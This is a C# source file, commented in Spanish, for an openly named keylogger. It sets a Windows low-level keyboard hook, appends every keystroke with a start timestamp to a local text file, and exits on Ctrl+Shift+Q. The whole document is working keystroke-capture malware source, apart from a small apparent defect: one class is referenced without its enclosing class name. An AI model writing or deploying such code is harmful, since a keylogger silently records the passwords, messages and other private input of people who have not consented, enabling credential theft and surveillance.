using System;
using System.Diagnostics;
using System.IO;  // Necesario para escribir en archivos
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyLogger
{
    private static string filePath = "Pulsaciones.txt";  // Ruta del archivo de salida

    private static void Main()
    {
        // Asegurarse de que el archivo esté creado y listo para el registro
        using (StreamWriter sw = File.AppendText(filePath))
        {
            sw.WriteLine("Keylogger iniciado en " + DateTime.Now);
        }

        KeyboardHook hook = new KeyboardHook();
        hook.KeyPressed += new EventHandler<KeyPressedEventArgs>(hook_KeyPressed);
        Application.Run();  // Mantener la aplicación en ejecución para capturar teclas de manera continua
    }

    private static void hook_KeyPressed(object sender, KeyPressedEventArgs e)
    {
        // Registrar cada pulsación en el archivo
        using (StreamWriter sw = File.AppendText(filePath))
        {
            sw.WriteLine(e.Key.ToString());
        }

        // Salir si se presiona Ctrl + Shift + Q
        if (Control.ModifierKeys == (Keys.Control | Keys.Shift) && e.Key == Keys.Q)
        {
            Application.Exit();  // Cerrar la aplicación
        }
    }
}

public class KeyboardHook : IDisposable
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    public event EventHandler<KeyPressedEventArgs> KeyPressed;

    private LowLevelKeyboardProc _proc;
    private IntPtr _hookID = IntPtr.Zero;

    public KeyboardHook()
    {
        _proc = HookCallback;
        _hookID = SetHook(_proc);
    }

    public void Dispose()
    {
        UnhookWindowsHookEx(_hookID);
    }

    private IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
        {
            int vkCode = Marshal.ReadInt32(lParam);
            KeyPressed?.Invoke(this, new KeyPressedEventArgs((Keys)vkCode));
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public IntPtr dwExtraInfo;
    }

    public class KeyPressedEventArgs : EventArgs
    {
        public Keys Key { get; private set; }

        public KeyPressedEventArgs(Keys key)
        {
            Key = key;
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
